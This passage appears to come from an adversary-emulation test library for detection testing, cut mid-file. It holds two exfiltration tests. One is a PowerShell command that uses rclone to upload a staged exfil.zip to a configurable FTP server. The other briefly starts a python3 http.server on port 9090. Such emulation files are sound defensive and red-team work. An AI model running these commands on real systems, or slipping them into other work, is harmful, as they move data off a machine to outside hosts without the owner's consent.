                            "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Python3 http.server",
                        "auto_generated_guid": "3ea1f938-f80a-4305-9aa8-431bc4867313",
                        "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "name": "sh",
                            "elevation_required": false,
                            "command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 11:35:10"
}